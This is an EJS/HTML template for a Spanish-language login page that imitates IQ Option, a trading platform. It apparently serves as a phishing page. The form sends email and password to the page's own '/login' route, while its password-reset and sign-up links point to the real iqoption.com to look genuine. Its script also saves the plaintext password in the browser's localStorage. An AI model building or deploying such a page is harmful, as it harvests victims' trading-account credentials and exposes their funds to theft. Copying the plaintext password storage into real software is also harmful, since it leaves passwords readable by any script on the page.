</head>

<body>
    <div class="floating-shapes">
        <div class="shape"></div>
        <div class="shape"></div>
        <div class="shape"></div>
    </div>

    <div class="login-container">
        <div class="login-header">
            <div class="logo-container">
                <img src="img/kali.logo.svg" alt="IQ">
            </div>
            <h1 class="text-2xl font-bold mb-2 login-title">Bienvenido de vuelta</h1>
            <p class="text-green-100 font-light login-subtitle">Inicia sesión en tu cuenta de IQ Option</p>
        </div>

        <div class="form-container">
            <% if (error) { %>
                <div class="alert-custom">
                    <i class="fas fa-exclamation-circle"></i>
                    <span>
                        <%= error %>
                    </span>
                </div>
                <% } %>

                    <form method="POST" action="/login" id="loginForm">
                        <div class="form-group">
                            <input type="email" class="form-control" id="email" name="email"
                                placeholder="Correo electrónico" required>
                            <i class="input-icon fas fa-envelope"></i>
                        </div>

                        <div class="form-group">
                            <div class="input-group">
                                <input type="password" class="form-control" id="password" name="password"
                                    placeholder="Contraseña" required>
                                <button type="button" class="password-toggle" onclick="togglePassword()"></button>
                            </div>
                        </div>

                        <label class="mobile-checkbox">
                            <input type="checkbox" id="rememberCredentials">
                            <span class="checkmark"></span>
                            <span class="text">Recordar</span>
                        </label>

                        <div class="custom-checkbox">
                            <input type="checkbox" id="remember" name="remember">
                            <div class="checkmark"></div>
                            <span>Recordar mis credenciales</span>
                        </div>

                        <div class="remember-section">
                            <a href="https://iqoption.com/es/change-password" class="forgot-link">¿Olvidaste tu
                                contraseña?</a>
                        </div>

                        <button type="submit" class="login-btn" id="loginBtn">
                            <span class="btn-text">Iniciar Sesión</span>
                            <i class="fas fa-spinner fa-spin btn-loading" style="display: none;"></i>
                        </button>
                    </form>
        </div>

        <!-- Footer móvil estilo Facebook -->
        <div class="mobile-footer">
            <a href="https://iqoption.com/es/register" class="create-account-btn">Crear cuenta nueva</a>
            <div class="meta-logo">
                <img src="img/bot-meta.png" alt="IQ">
                <span>IQ Option</span>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Password toggle functionality
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleButton = document.querySelector('.password-toggle');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleButton.classList.add('show-password');
            } else {
                passwordInput.type = 'password';
                toggleButton.classList.remove('show-password');
            }
        }

        // Unified remember credentials functionality
        window.addEventListener('load', function () {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const mobileCheckbox = document.getElementById('rememberCredentials');
            const desktopCheckbox = document.getElementById('remember');
            const loginForm = document.getElementById('loginForm');

            // Load saved credentials on page load
            function loadCredentials() {
                const savedEmail = localStorage.getItem('iqoption_email');
                const savedPassword = localStorage.getItem('iqoption_password');
                const rememberState = localStorage.getItem('iqoption_remember') === 'true';

                if (rememberState && savedEmail && savedPassword) {
                    emailInput.value = savedEmail;
                    passwordInput.value = savedPassword;
                    if (mobileCheckbox) mobileCheckbox.checked = true;
                    if (desktopCheckbox) desktopCheckbox.checked = true;
                }
            }

            // Save credentials function
            function saveCredentials() {
                const isRememberChecked = (mobileCheckbox && mobileCheckbox.checked) ||
                    (desktopCheckbox && desktopCheckbox.checked);

                if (isRememberChecked) {
                    localStorage.setItem('iqoption_email', emailInput.value);
                    localStorage.setItem('iqoption_password', passwordInput.value);
                    localStorage.setItem('iqoption_remember', 'true');
                } else {
                    localStorage.removeItem('iqoption_email');
                    localStorage.removeItem('iqoption_password');
                    localStorage.removeItem('iqoption_remember');
                }
            }

            // Clear credentials function
            function clearCredentials() {
                localStorage.removeItem('iqoption_email');
                localStorage.removeItem('iqoption_password');
                localStorage.removeItem('iqoption_remember');
            }

            // Load credentials on page load
            loadCredentials();

            // Mobile checkbox change handler
            if (mobileCheckbox) {
                mobileCheckbox.addEventListener('change', function () {
                    if (!this.checked) {
                        clearCredentials();
                    }
                });
            }

            // Desktop checkbox change handler
            if (desktopCheckbox) {
                desktopCheckbox.addEventListener('change', function () {
                    if (!this.checked) {
                        clearCredentials();
                    }
                });
            }

            // Form submit handler
            if (loginForm) {
                loginForm.addEventListener('submit', function (e) {
                    saveCredentials();

                    // Loading animation
                    const loginBtn = document.getElementById('loginBtn');
                    const btnText = loginBtn.querySelector('.btn-text');
                    const btnLoading = loginBtn.querySelector('.btn-loading');

                    if (btnText && btnLoading) {
                        loginBtn.classList.add('loading');
                        btnText.style.display = 'none';
                        btnLoading.style.display = 'inline-block';
                    }
                });
            }
        });
    </script>
</body>

</html>